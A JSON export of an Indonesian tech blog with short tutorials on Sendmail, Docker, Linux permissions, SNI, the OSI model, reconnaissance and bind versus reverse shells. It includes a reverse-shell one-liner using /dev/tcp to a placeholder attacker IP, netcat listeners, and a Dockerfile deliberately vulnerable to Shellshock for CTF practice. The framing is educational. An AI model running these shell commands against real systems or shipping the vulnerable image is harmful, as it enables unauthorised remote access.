
[{"content":"Selamat datang!\naku menyediakan berbagai konten seputar teknologi informasi, keamanan siber, dan lainnya. Dan juga pengalamanku.\n","date":"13 Desember 2024","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"13 Desember 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"Dibawah ini adalah daftar konteks yang ada di blog ini. Silahkan klik konten yang ingin anda baca.\n","date":"13 Desember 2024","externalUrl":null,"permalink":"/contents/","section":"Contents","summary":"","title":"Contents","type":"contents"},{"content":"Berbagai topik terkait pengembangan aplikasi dan teknologi, mulai dari pemrograman, desain, manajemen proyek, hingga teknologi terkini yang sedang berkembang.","date":"13 Desember 2024","externalUrl":null,"permalink":"/contents/development/","section":"Contents","summary":"Artikel yang membahas tentang pengembangan aplikasi dan teknologi","title":"Development","type":"contents"},{"content":" Pengertian SendMail # SendMail adalah sebuah program yang digunakan untuk mengirimkan email dari server ke server lainnya menggunakan protokol SMTP (Simple Mail Transfer Protocol).\nInstalasi SendMail # Dalam environment ini kita akan menggunakan Ubuntu sebagai sistem operasi. Untuk menginstall SendMail, kita dapat menggunakan perintah berikut:\nsudo apt install sendmail sendmail-bin mailutils -y Setelah proses instalasi selesai, kita dapat memulai konfigurasi SendMail dengan mengedit file konfigurasi sendmail.mc yang terletak di /etc/mail/sendmail.mc.\nsudo nano /etc/mail/sendmail.mc Tambahkan baris berikut di dalam file konfigurasi sendmail.mc:\nFEATURE(`relay_hosts_only\u0026#39;)dnl FEATURE(`access_db\u0026#39;)dnl dan juga cari baris berikut: DAEMON_OPTIONS(`Family=inet, Name=MTA-v4, Port=smtp, Addr=0.0.0.0\u0026rsquo;)dnl\nUbah baris Addr menjadi 0.0.0.0 agar server dapat menerima email dari luar. Setelah itu tambahkan baris kode di file /etc/mail/access:\nConnect:192.168.100 RELAY Jika IP server berbeda, asumsikan ip server adalah 192.168.100.99 maka ganti 192.168.100 dengan IP server yang digunakan. Dan jalankan perintah berikut:\nsudo makemap hash /etc/mail/access.db \u0026lt; /etc/mail/access Setelah konfigurasi selesai, kita dapat melakukan langkah berikut:\nsudo sendmailconfig Ketika ada pertanyaan, tekan Y untuk melanjutkan.\nTesting SendMail # Sebelum melakukan testing, pastikan hostname server sudah diatur dengan benar. Untuk melakukan testing, kita dapat menggunakan perintah berikut:\nhostnamectl #check hostname sudo hostnamectl set-hostname mail.local #ubah nama hostname (Bebas) Kita akan menggunakan host mail.local sebagai contoh. Setelah itu, kita dapat melakukan testing dengan perintah berikut:\nsudo nano /etc/hosts Tambahkan baris berikut:\n192.168.100.99 mail.local Ganti 192.168.1.X dengan IP server yang digunakan. Kalau Kasus ini IP server adalah 192.168.100.99 check IP server dengan perintah ip a\nBeres! sekarang kita dapat melakukan testing dengan perintah berikut:\nsudo systemctl restart sendmail sudo systemctl enable sendmail sudo systemctl start sendmail Konfirmasi Hostname via nslookup:\nnslookup mail.local Test koneksi PC dengan server telnet 192.168.100.99 25 Testing sendmail ke diri sendiri dengan perintah berikut:\necho \u0026#34;Test email\u0026#34; | mail -s \u0026#34;Subject: Test Email\u0026#34; ubuntu@mail.local Check hasil pengiriman email di /var/mail/\ncd /var/mail/ cat (nama user yang ingin dicek) Jika ingin melihat proses pengiriman email (DEBUG), kita dapat menggunakan perintah berikut:\nsudo tail -f /var/log/mail.log Kesimpulan # Dengan demikian, kita telah berhasil mengkonfigurasi SendMail pada server Linux. Dengan konfigurasi ini, server dapat mengirimkan email ke server lainnya. Mungkin ada beberapa konfigurasi tambahan yang perlu dilakukan tergantung kebutuhan server.\n","date":"13 Desember 2024","externalUrl":null,"permalink":"/contents/development/configure-sendmail/","section":"Contents","summary":"","title":"Konfigurasi SendMail Di Linux Server","type":"contents"},{"content":"","date":"13 Desember 2024","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"13 Desember 2024","externalUrl":null,"permalink":"/tags/mail-server/","section":"Tags","summary":"","title":"Mail Server","type":"tags"},{"content":"","date":"13 Desember 2024","externalUrl":null,"permalink":"/tags/server/","section":"Tags","summary":"","title":"Server","type":"tags"},{"content":"","date":"13 Desember 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"13 Desember 2024","externalUrl":null,"permalink":"/categories/web-development/","section":"Categories","summary":"","title":"Web Development","type":"categories"},{"content":"Setelah berhasil mendapatkan akses ke sistem target, biasanya dilakukan oleh attacker adalah mempertahankan akses ke sistem tersebut. Salah satu teknik yang sering digunakan untuk mempertahankan akses adalah dengan menggunakan Bind Shell atau Reverse Shell.\nPerbedaan antara Bind dan Reverse Shell # Aspek Bind Shell Reverse Shell Definisi Sebuah shell yang \u0026ldquo;mengikat\u0026rdquo; ke port tertentu pada target, menunggu koneksi dari penyerang. Sebuah shell yang diinisiasi oleh target dengan menghubungi mesin penyerang. Inisiasi Koneksi Penyerang menghubungi target secara langsung. Target menghubungi penyerang untuk memulai koneksi. Port Target membuka port yang dapat diakses oleh penyerang. Penyerang membuka port yang akan dihubungi oleh target. Firewall Dapat dicegah jika firewall memblokir port yang dibuka oleh target. Lebih sulit dicegah karena koneksi keluar biasanya diizinkan oleh firewall. Keamanan Lebih mudah terdeteksi karena port terbuka pada target. Lebih sulit terdeteksi karena memanfaatkan koneksi keluar yang sering diizinkan. Gambaran sederhana # Bind Shell # flowchart RL A[Attacker] --\u003e B[Server] Attacker akan membuka koneksi server untuk mendapatkan akses shell.\nReverse Shell # flowchart LR A[Server] --\u003e B[Attacker] Server akan membuka koneksi ke attacker untuk mendapatkan akses shell.\nImplementasi Sedehana # Pada kasus ini, kita akan menggunakan nc untuk membuat bind dan reverse shell. yang akan digunakan untuk membuat koneksi shell antara attacker dan server. Secara default, nc tersedia di sistem operasi Linux, tetapi jika menggunakan sistem operasi seperti Windows, sehingga dapat menginstalnya secara manual.\n$ sudo apt install nc Bind Shell # Asumsikan sudah ada akses terminal server dan kita ingin membuat bind shell pada port 4444\nserver@administrator ~ $ nc -lnvp 4444 Maka attacker dapat terhubung ke server dengan output sebagai berikut:\nattacker@ubuntu2404 ~ $ nc \u0026lt;server_ip\u0026gt; 4444 server@administrator ~ $ whoami server Catatan: Penggunaan bind shell cenderung lebih mudah terdeteksi karena port terbuka pada target.\nReverse Shell # Misalkan belum ada akses ke terminal server, attacker akan membuat reverse shell pada port 9999 Asumsikan telah mengeksekusi script berdasarkan interaksi user pada server:\n#file: shell.sh sh -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;attacker_ip\u0026gt;/9999 0\u0026gt;\u0026amp;1 Maka server akan terhubung ke attacker dengan output sebagai berikut:\nattacker@ubuntu2404 ~ $ nc -lnvp 9999 # user execute the script by running `shell.sh` server@administrator ~ $ server@administrator ~ $ whoami server Kesimpulan # Dengan menggunakan Bind Shell atau Reverse Shell, attacker dapat mempertahankan akses ke sistem target. Namun, perlu diingat bahwa penggunaan Bind Shell cenderung lebih mudah terdeteksi karena port terbuka pada target. Sebaliknya, Reverse Shell lebih sulit terdeteksi karena memanfaatkan koneksi keluar yang sering diizinkan oleh firewall.\nTerima kasih :)\n","date":"29 November 2024","externalUrl":null,"permalink":"/contents/cyber-security/bind-and-reverse-shell/","section":"Contents","summary":"","title":"Bind dan Reverse Shell","type":"contents"},{"content":"","date":"29 November 2024","externalUrl":null,"permalink":"/contents/cyber-security/","section":"Contents","summary":"Artikel tentang keamanan siber. Mulai dari dasar-dasar keamanan siber, hingga teknik-teknik serangan siber.","title":"Cyber Security","type":"contents"},{"content":"","date":"29 November 2024","externalUrl":null,"permalink":"/tags/exploitation/","section":"Tags","summary":"","title":"Exploitation","type":"tags"},{"content":"","date":"29 November 2024","externalUrl":null,"permalink":"/categories/pentesting/","section":"Categories","summary":"","title":"Pentesting","type":"categories"},{"content":"","date":"29 November 2024","externalUrl":null,"permalink":"/tags/security/","section":"Tags","summary":"","title":"Security","type":"tags"},{"content":"","date":"28 November 2024","externalUrl":null,"permalink":"/categories/development/","section":"Categories","summary":"","title":"Development","type":"categories"},{"content":"","date":"28 November 2024","externalUrl":null,"permalink":"/tags/devops/","section":"Tags","summary":"","title":"DevOps","type":"tags"},{"content":"","date":"28 November 2024","externalUrl":null,"permalink":"/tags/docker/","section":"Tags","summary":"","title":"Docker","type":"tags"},{"content":" Apa itu Kontainer? # Kontainer adalah unit perangkat lunak yang memungkinkan pengembang untuk mengemas aplikasi dan semua dependensinya ke dalam satu paket. Kontainer memungkinkan aplikasi untuk berjalan di lingkungan yang terisolasi. Kontainer juga memungkinkan pengembang untuk memastikan aplikasi berjalan dengan benar di lingkungan yang berbeda.\nBagaimana Docker Bekerja? # sequenceDiagram participant User participant Docker User-\u003e\u003eDocker: Build image Docker-\u003e\u003eDocker: Build container Docker-\u003e\u003eUser: Run container User-\u003e\u003eDocker: Stop container Docker-\u003e\u003eDocker: Remove container Docker-\u003e\u003eUser: Done Pada diagram di atas, kita dapat melihat bagaimana Docker bekerja. Pengguna membangun dengan perintah docker build. kemudian digunakan untuk membuat kontainer dengan perintah docker run. Ketika kontainer selesai berjalan, pengguna dapat menghentikan kontainer dengan perintah docker stop dan menghapusnya dengan perintah docker rm.\nInstalasi Docker # Untuk menginstalasi Docker, Anda dapat mengikuti langkah-langkah berikut:\n# Debian/Ubuntu $ sudo apt update \u0026amp;\u0026amp; sudo apt install docker.io Studi Kasus # Misalnya, pada kasus ini kita akan membuat kontainer dalam konteks CTF yang rentan terhadap Shellshock CVE-2014-6271.\n#file dockerfile FROM ubuntu:14.04 # Install Bash yang rentan CVE-2014-6271 RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y bash=4.3-7ubuntu1 \u0026amp;\u0026amp; \\ apt-get clean # Tambahkan CGI sederhana RUN mkdir -p /var/www/cgi-bin COPY test.sh /var/www/cgi-bin/test.sh RUN chmod +x /var/www/cgi-bin/test.sh # Install Apache2 dan enable CGI RUN apt-get install -y apache2 \u0026amp;\u0026amp; \\ a2enmod cgi # Konfigurasi Apache RUN echo \u0026#34;ScriptAlias /cgi-bin/ /var/www/cgi-bin/\u0026#34; \u0026gt;\u0026gt; /etc/apache2/sites-enabled/000-default.conf # Expose port untuk akses EXPOSE 80 # Jalankan Apache di foreground CMD [\u0026#34;apachectl\u0026#34;, \u0026#34;-D\u0026#34;, \u0026#34;FOREGROUND\u0026#34;] FROM mendefinisikan image dasar yang akan digunakan untuk membangun image baru. RUN menjalankan perintah di dalam kontainer. COPY menyalin file dari host ke dalam kontainer. EXPOSE mengekspos port yang digunakan oleh kontainer. CMD menjalankan perintah ketika kontainer dimulai. #file test.sh #!/bin/bash echo \u0026#34;Hello World\u0026#34; Setelah membuat Dockerfile di atas, kita dapat membangunnya dengan perintah\n$ docker build -t shellshock . Langkah selanjutnya adalah menjalankan kontainer dengan perintah\n$ docker run -d -p 8080:80 shellshock Catatan: Untuk pengujian, pastikan Anda menjalankan kontainer ini di lingkungan yang terisolasi karena rentan terhadap serangan Shellshock. dan kita dapat mengaksesnya melalui http://localhost:8080/cgi-bin/test.sh.\nAkses Kontainer # Untuk mengakses kontainer, kita dapat menggunakan perintah docker exec. Misalnya, untuk masuk ke dalam kontainer, kita dapat menggunakan perintah berikut:\n$ docker exec -it \u0026lt;container_id\u0026gt; /bin/bash Start, Stop, dan Remove Kontainer # Untuk memulai kontainer, gunakan perintah\n$ docker start \u0026lt;container_id\u0026gt; Untuk menghentikan kontainer, gunakan perintah\n$ docker stop \u0026lt;container_id\u0026gt; Untuk menghapus kontainer, gunakan perintah\n$ docker rm \u0026lt;container_id\u0026gt; Menghapus Images # Untuk menghapus image, gunakan perintah\n$ docker rmi \u0026lt;image_id\u0026gt; Dengan demikian, kita telah melihat bagaimana kontainerisasi bekerja dengan Docker dan bagaimana kita dapat membuat kontainer tertentu untuk keperluan pengujian.\n","date":"28 November 2024","externalUrl":null,"permalink":"/contents/development/docker-containerization/","section":"Contents","summary":"","title":"Kontenerisasi App dengan Docker","type":"contents"},{"content":"","date":"15 November 2024","externalUrl":null,"permalink":"/categories/devops/","section":"Categories","summary":"","title":"DevOps","type":"categories"},{"content":" Linux Symbolic Link # Linux Symbolic Link adalah sebuah file yang mengarah ke referensi file atau direktori tanpa harus membuat salinan dari file atau direktori tersebut.\ngraph TD A[File Asli /home/user/original.txt] B[Symbolic Link /home/user/link.txt] A --\u003e|Destionation| B Membuat Symbolic Link # ln -s [source] [destination] source : file atau direktori yang akan di-link. destination : nama symbolic link yang akan dibuat. flag -s digunakan untuk membuat symbolic link. lihat man ln untuk informasi lebih lanjut.\nContoh Symbolic Link # ln -s /home/user/original.txt /home/user/link.txt Pastikan source dan destination harus memiliki path yang benar. Membuat Hard Link # ln [source] [destination] Contoh Hard Link # ln /home/user/original.txt /home/user/link.txt Hard Link vs Symbolic Link # Hard Link : mengarah ke file asli. Jika file asli dihapus, hard link masih bisa diakses. Symbolic Link : mengarah ke path file asli. Jika file asli dihapus, symbolic link tidak bisa diakses. Hard link tidak bisa digunakan untuk direktori. Jika ingin membuat link ke direktori, gunakan symbolic link. ","date":"15 November 2024","externalUrl":null,"permalink":"/contents/development/linux-symlink/","section":"Contents","summary":"","title":"Linux Symbolic Link","type":"contents"},{"content":"","date":"15 November 2024","externalUrl":null,"permalink":"/tags/system/","section":"Tags","summary":"","title":"System","type":"tags"},{"content":"Infrastruktur adalah fondasi dari sistem teknologi informasi. Artikel-artikel dalam kategori ini membahas topik-topik seperti jaringan, keamanan, dan teknologi infrastruktur lainnya.\n","date":"6 November 2024","externalUrl":null,"permalink":"/contents/infrastructure/","section":"Contents","summary":"Artikel tentang infrastruktur teknologi, jaringan, dan keamanan.","title":"Infrastructure","type":"contents"},{"content":" Linux Privilage # chmod # chmod perintah di sistem operasi Unix/Linux yang digunakan untuk mengubah izin (permissions) dari file atau direktori.\nSintaks # chmod [options] mode file options : opsi yang dapat digunakan. mode : mode yang akan diberikan pada file atau direktori. file : file atau direktori yang akan diberikan mode. mode numerik\nNumerik mode(octal number) :\n0 : tidak ada izin 1 : eksekusi 2 : tulis 4 : baca (4+2+1) = 7. Maka, 7 = read + write + execute (rwx) mode simbolik Simbolik mode :\nu : pemilik file g : grup file o : lainnya a : semua + : menambahkan hak akses - : menghapus hak akses = : mengganti hak akses contoh : u+rwx = menambahkan hak akses read, write, dan execute pada pemilik file. Penggunaan chmod Mode Numerik # chmod 775 file.txt maka, file.txt akan memiliki izin seperti berikut :\n-rwxrwxr-x 1 dilz ubuntu 22 Oct 27 20:01 file.txt Penggunaan chmod Mode Simbolik # chmod u+rwx,g+rx,o+r file.txt maka, file.txt akan memiliki izin seperti berikut :\n-rwxr-xr-- 1 dilz ubuntu 22 Oct 27 20:01 file.txt Perhatikan bahwa ada 3 grup izin yang diberikan pada file.txt\nrwx : pemilik file r-x : grup file r-- : lainnya -rwx|rwx|r-x ^ ^ ^ ^ | | | | t u g o t : tipe u : pemilik file g : grup file o : lainnya chown # chown perintah di sistem operasi Unix/Linux yang digunakan untuk mengubah kepemilikan file atau direktori.\nSintaks # chown [options] user:group file options : opsi yang dapat digunakan. user : nama pengguna yang akan diberikan kepemilikan. group : nama grup yang akan diberikan kepemilikan. file : file atau direktori yang akan diberikan kepemilikan. Penggunaan chown # chown cecep:ubuntu file.txt maka, file.txt akan memiliki kepemilikan seperti berikut :\n-rwxrwxr-x 1 cecep ubuntu 22 Oct 27 20:01 file.txt Selain itu, kita juga dapat menggunakan opsi -R untuk mengubah kepemilikan secara rekursif pada direktori dan subdirektori.\nTips penggunaan chmod dan chown # Jangan memberikan hak akses yang tidak perlu pada file atau direktori. Jangan memberikan hak akses 777 pada file atau direktori. Jangan memberikan kepemilikan file atau direktori pada pengguna yang tidak perlu. Gunakan opsi -R dengan hati-hati, karena dapat merubah kepemilikan secara rekursif pada direktori dan subdirektori. ","date":"27 Oktober 2024","externalUrl":null,"permalink":"/contents/development/linux-privilage/","section":"Contents","summary":"","title":"Linux Privilage","type":"contents"},{"content":" Bagaimana cara SNI bekerja? # Server Name Indication (SNI) adalah ekstensi protokol TLS yang memungkinkan klien untuk mengirimkan nama host tujuan sebagai bagian dari TLS handshake. Ini memungkinkan server untuk menggunakan sertifikat SSL/TLS yang berbeda pada satu alamat IP.\nsequenceDiagram participant Client participant Server participant TLS Client-\u003e\u003eTLS: Client Hello (SNI in handshake) TLS-\u003e\u003eServer: Server selection based on SNI Server-\u003e\u003eTLS: Server Hello (with certificate) TLS-\u003e\u003eClient: Server Certificate Client-\u003e\u003eTLS: Finished (Encrypted handshake) TLS-\u003e\u003eServer: Forward encrypted communication Server-\u003e\u003eClient: Encrypted data Catatan: Jika teks tidak terlihat dengan jelas, ganti tema situs web ke mode terang\nCara Kerja SNI # Permintaan Klien: Saat klien (misalnya, peramban web) memulai koneksi ke server, ia mengirimkan informasi SNI sebagai bagian dari handshake TLS. Informasi ini mencakup nama host (hostname) dari situs web yang ingin diakses. Respon Server: Berdasarkan nama host yang diminta, server akan memilih sertifikat SSL yang sesuai untuk domain tersebut. Koneksi Aman: Setelah sertifikat SSL dipilih, handshake TLS selesai, dan koneksi aman terbentuk antara klien dan server. Mengapa SNI Penting? # Tanpa SNI, sebuah server hanya dapat melayani satu sertifikat SSL per alamat IP. Jika ada beberapa situs web yang membutuhkan enkripsi TLS pada satu server atau satu alamat IP, SNI memungkinkan setiap situs web untuk memiliki sertifikat SSL sendiri, tanpa memerlukan alamat IP yang berbeda untuk masing-masing situs.\nKeuntungan dan Keterbatasan SNI # Keuntungan # Menghemat IP: Tidak perlu menggunakan banyak alamat IP untuk setiap domain. Mengurangi Biaya: Menghindari kebutuhan untuk membeli alamat IP tambahan. Efisiensi Infrastruktur: Hosting beberapa situs HTTPS di satu server lebih mudah dengan SNI. Keterbatasan # Kompatibilitas Perangkat Lama: Beberapa perangkat dan peramban lama tidak mendukung SNI, yang dapat membatasi akses. Dukungan Server: Harus memastikan server yang digunakan mendukung SNI dan dapat melayani beberapa sertifikat SSL. Celah SNI terhadap HTTP Injection # Ada beberapa cara di mana SNI dapat dipengaruhi dalam konteks keamanan jaringan yang lebih luas. Konfigurasi yang tepat sangat penting untuk mencegah potensi serangan.\nEksposur Nama Host # Informasi SNI dikirimkan dalam teks terbuka di Client Hello selama handshake TLS. Penyusup dapat melihat nama domain yang diminta, yang bisa membuka peluang untuk:\nMelakukan Pemblokiran Konten (Content Filtering): Penyusup yang berada di antara koneksi (misalnya, man-in-the-middle) dapat memblokir atau mengarahkan lalu lintas ke alamat palsu berdasarkan nama domain yang ditemukan dalam SNI. Menginjeksi Respon HTTP Tidak Sah: Jika ada elemen HTTP yang tidak terenkripsi, penyerang dapat melakukan HTTP injection untuk menambahkan skrip atau konten berbahaya pada permintaan yang seharusnya aman. Contoh Kasus yang Memanfaatkan Celah SNI # Biasanya, SNI tidak digunakan untuk mengeksploitasi celah keamanan. Namun, ada beberapa kasus di mana informasi SNI dapat dimanfaatkan untuk tujuan jahat:\nPemblokiran Situs: Penyusup dapat menggunakan informasi SNI untuk memblokir akses ke situs tertentu, seperti pemblokiran situs web yang dianggap tidak diinginkan atau berbahaya yang dikunjungi oleh pengguna (misalnya, Internet Positif). Pencurian Informasi: Penyusup dapat menggunakan informasi SNI untuk mengidentifikasi situs web yang dikunjungi oleh pengguna dan mencuri informasi sensitif yang dikirimkan melalui koneksi HTTPS (misalnya, informasi login, data pribadi, dll.). ","date":"9 Oktober 2024","externalUrl":null,"permalink":"/contents/infrastructure/bagaimana-sni-bekerja/","section":"Contents","summary":"","title":"Bagaimana cara SNI bekerja?","type":"contents"},{"content":"","date":"9 Oktober 2024","externalUrl":null,"permalink":"/categories/infrastructure/","section":"Categories","summary":"","title":"Infrastructure","type":"categories"},{"content":"","date":"9 Oktober 2024","externalUrl":null,"permalink":"/tags/network/","section":"Tags","summary":"","title":"Network","type":"tags"},{"content":"","date":"7 Oktober 2024","externalUrl":null,"permalink":"/tags/model/","section":"Tags","summary":"","title":"Model","type":"tags"},{"content":" OSI Layer Model # Model OSI (Open Systems Interconnection) adalah model referensi yang menggambarkan bagaimana aplikasi dapat berkomunikasi dengan perangkat lainnya. Model ini terdiri dari tujuh lapisan, dan setiap lapisan memiliki fungsi tertentu. Model ini memungkinkan berbagai perangkat keras dan perangkat lunak untuk berkomunikasi dengan mudah.\nLapisan OSI # graph TD; A[Application Layer] --\u003e B[Presentation Layer]; B --\u003e C[Session Layer]; C --\u003e D[Transport Layer]; D --\u003e E[Network Layer]; E --\u003e F[Data Link Layer]; F --\u003e G[Physical Layer]; Physical Layer (Lapisan Fisik): Bertanggung jawab untuk transmisi fisik bit antar perangkat. Menentukan bagaimana sinyal dikirim melalui media komunikasi.\nData Link Layer (Lapisan Tautan Data): Mengirimkan frame antar perangkat di jaringan lokal, sekaligus menangani koreksi kesalahan yang terjadi pada lapisan fisik.\nNetwork Layer (Lapisan Jaringan): Mengatur pengiriman paket data antar jaringan serta menentukan jalur terbaik (routing) yang diambil oleh paket.\nTransport Layer (Lapisan Transport): Menyediakan pengiriman data yang andal antar perangkat, termasuk kontrol kesalahan yang terjadi pada lapisan jaringan.\nSession Layer (Lapisan Sesi): Mengatur, memelihara, dan mengelola sesi komunikasi antara aplikasi yang berjalan di dua perangkat.\nPresentation Layer (Lapisan Presentasi): Bertanggung jawab untuk mengonversi data antara format yang digunakan oleh aplikasi dan format yang dibutuhkan untuk transmisi.\nApplication Layer (Lapisan Aplikasi): Menyediakan layanan jaringan langsung kepada pengguna, seperti email, browsing web, atau transfer file.\nCelah Keamanan pada Setiap Lapisan OSI # Physical Layer (Lapisan Fisik)\nCelah:\nPenyadapan fisik (wiretapping) atau intersepsi data pada media komunikasi. Jamming atau gangguan sinyal pada perangkat nirkabel. Serangan fisik pada perangkat jaringan (misalnya router, switch). Data Link Layer (Lapisan Tautan Data)\nCelah:\nMAC Spoofing: Penyerang menyamar sebagai perangkat dengan alamat MAC palsu untuk mengakses jaringan. ARP Spoofing: Manipulasi tabel ARP untuk mengarahkan lalu lintas ke perangkat penyerang. Serangan VLAN hopping: Menyusup ke VLAN lain yang seharusnya terisolasi. Network Layer (Lapisan Jaringan)\nCelah:\nIP Spoofing: Penyerang menyamar sebagai alamat IP lain untuk mengelabui target. Routing Attacks: Manipulasi protokol routing untuk mengubah jalur data, seperti serangan BGP hijacking. Serangan DDoS (Distributed Denial of Service) melalui banjir paket IP. Transport Layer (Lapisan Transportasi)\nCelah:\nPort Scanning: Mendeteksi port terbuka untuk eksploitasi lebih lanjut. TCP SYN Flood: Membanjiri server dengan permintaan koneksi TCP untuk membuatnya tidak dapat melayani permintaan sah. Session Hijacking: Penyerang mengambil alih sesi komunikasi dengan mencuri ID sesi. Session Layer (Lapisan Sesi)\nCelah:\nSession Fixation: Penyerang mengarahkan pengguna ke sesi yang telah ditentukan sebelumnya dan mengambil alih. Session Hijacking: Pencurian sesi yang sah untuk menyusup ke komunikasi antara dua perangkat. Presentation Layer (Lapisan Presentasi)\nCelah:\nData Encryption Attacks: Serangan terhadap enkripsi, seperti serangan man-in-the-middle (MITM) untuk mencuri atau mengubah data sebelum atau setelah enkripsi. Serangan code injection jika data tidak diproses dengan benar. Application Layer (Lapisan Aplikasi)\nCelah:\nBuffer Overflow: Input yang terlalu besar dapat menyebabkan aplikasi crash atau dieksploitasi untuk menjalankan kode berbahaya. SQL Injection: Menyisipkan perintah SQL ke dalam input aplikasi untuk mengakses atau memodifikasi basis data. Cross-Site Scripting (XSS): Menyuntikkan skrip berbahaya ke dalam aplikasi web untuk mencuri data pengguna. ","date":"7 Oktober 2024","externalUrl":null,"permalink":"/contents/infrastructure/osi-layer-model/","section":"Contents","summary":"","title":"OSI Layer Model","type":"contents"},{"content":"Pada tahap Active Reconnaissance, penyerang akan melakukan scanning secara langsung terhadap target untuk mengumpulkan informasi lebih lanjut. Dalam tahap ini, penyerang akan mencari informasi tentang port yang terbuka, layanan yang berjalan, dan versi perangkat lunak yang digunakan oleh target. Dua teknik utama yang digunakan dalam Active Reconnaissance adalah Port Scanning dan Service Enumeration.\nPort Scanning # Biasanya, target memiliki beberapa port yang terbuka untuk menerima koneksi. Port ini digunakan untuk berbagai layanan seperti HTTP, FTP, SSH, dll.\nTools yang umum digunakan untuk melakukan port scanning adalah:\nNmap: Network Mapper, tool open source yang sangat populer untuk scanning jaringan. Masscan: Tool yang dirancang untuk melakukan scanning port secara cepat. Zmap: Tool yang dirancang untuk melakukan scanning port secara skala besar. Hping: Tool yang dirancang untuk melakukan scanning port dengan teknik yang berbeda. Netcat: Tool yang digunakan untuk melakukan scanning port dan juga berfungsi sebagai backdoor. Dalam kasus ini, kita akan melakukan simulasi menggunakan Nmap untuk melakukan scanning port terhadap target 192.168.1.1 yaitu hardware router yang terhubung ke jaringan lokal. ` pastikan telah melakukan Passive Reconnaissance sebelum melakukan Active Reconnaissance. $ nmap -T5 192.168.1.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 12:15 WIB Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 30.13% done; ETC: 12:15 (0:00:07 remaining) Nmap scan report for 192.168.1.1 Host is up (0.0097s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds Dari hasil scanning di atas, kita mengetahui bahwa target memiliki 3 port yang terbuka, yaitu:\nPort 21: FTP Port 80: HTTP Port 443: HTTPS Service Enumeration # Berlanjut dari hasil port scanning, kita dapat melakukan service enumeration untuk mengetahui versi perangkat lunak yang digunakan oleh target. Informasi ini dapat membantu penyerang dalam mengeksploitasi kerentanan yang ada pada versi perangkat lunak tersebut.\n$ nmap -sV -T5 192.168.1.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 12:17 WIB Nmap scan report for 192.168.1.1 Host is up (0.010s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 80/tcp open http nginx 443/tcp open ssl/http nginx Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.05 seconds Dari hasil service enumeration di atas, kita mengetahui bahwa:\nPort 21: FTP menggunakan vsftpd 2.3.4 port 80 dan 443: Menggunakan nginx sebagai web server. Sistem operasi yang digunakan adalah Unix. Dengan informasi ini, kita mendapatkan versi yang di tampilkan oleh target, sehingga kita dapat mencari kerentanan yang ada pada vsftpd 2.3.4.\nDengan melakukan port scanning dan service enumeration, penyerang dapat mengumpulkan informasi yang cukup untuk melanjutkan ke tahap selanjutnya dalam proses penetration testing.\nCatatan: Pada proses Scanning dan Enumeration, ada kondisi dimana terdapat kondisi yang tidak diinginkan seperti false positive atau false negative. Oleh karena itu, perlu dilakukan validasi lebih lanjut untuk memastikan hasil scanning yang akurat.\nDemikianlah penjelasan singkat tentang Port Scanning dan Service Enumeration. Semoga bermanfaat! dan tetap explore dan belajar lebih lanjut.\n","date":"25 Agustus 2024","externalUrl":null,"permalink":"/contents/cyber-security/port-scanning-and-service-enumeration/","section":"Contents","summary":"","title":"Port Scanning and Service Enumeration","type":"contents"},{"content":"","date":"25 Agustus 2024","externalUrl":null,"permalink":"/tags/reconnaissance/","section":"Tags","summary":"","title":"Reconnaissance","type":"tags"},{"content":"Konsep reconnaissance adalah tahap awal dalam proses penilaian keamanan atau hacking yang bertujuan untuk mengumpulkan informasi sebanyak mungkin tentang target. Ini adalah langkah kunci yang membantu penyerang atau penilai keamanan memahami struktur, konfigurasi, dan potensi kerentanannya.\nDalam Reconnaissance terbagi menjadi 2 yaitu:\nPassive Reconnaissance Mengumpulkan informasi tanpa berinteraksi langsung. Dengan penggumpulan data basic pada sebuah target, yang meliputi seperti CDN, IP Scan, Technology in used, dan arsitektur jaringan yang terexpose. Dengan menggunakan Passive scanning, tentunya memiliki kelebihan, yaitu senyap. Yang dimana Target tidak akan melakukan Logging data akses atau membaca footprint penyerang. Namun tidak seaggresive Active Scan\nActive Reconnaissance Mengumpulkan informasi dengan secara langsung berinteraksi dengan target. yang meliputi Port Scanning, Service Enumeration dan Path Enumeration. Dalam hal Active Scan, tentunya jejak penyerang akan terlihat oleh target dengan sangat mudah untuk tracing sumber penyerang atau pun footprint yang ditinggal oleh penyerang, seperti apa saja yang diakses atau mencoba masuk.\nCara Melakukan Passive Scanning # Search Online # Penjelasan:\nMencari informasi tentang target melalui sumber-sumber online dapat memberikan wawasan awal yang penting. Ini bisa termasuk informasi yang dipublikasikan di media sosial, forum, atau situs web lainnya.\nCara:\nGunakan Mesin Pencari:\nCari nama target, domain, atau IP menggunakan mesin pencari seperti Google. Gunakan query spesifik seperti \u0026quot;targetname site:example.com\u0026quot; untuk menemukan informasi yang relevan. Periksa Media Sosial:\nTeliti profil media sosial, postingan, atau komentar yang mungkin mengungkapkan informasi tentang target atau teknologi yang digunakan. Cek Forum dan Blog:\nTelusuri forum atau blog yang mungkin membahas tentang target atau teknologi yang digunakan oleh target. Whois Lookup # Penjelasan:\nWHOIS lookup memberikan informasi tentang pendaftaran domain, seperti pemilik, tanggal pendaftaran, dan server DNS. Ini dapat membantu dalam mengidentifikasi pemilik atau afiliasi domain.\nCara:\nGunakan Perintah WHOIS:\nJalankan whois \u0026lt;domain\u0026gt; di terminal atau gunakan layanan WHOIS online. Analisis Informasi WHOIS:\nCatat detail seperti alamat pendaftar, email kontak, dan server DNS. Ini dapat memberikan petunjuk tambahan tentang target. Mapping Target # Penjelasan:\nMapping target melibatkan pemetaan dan pemahaman struktur dan 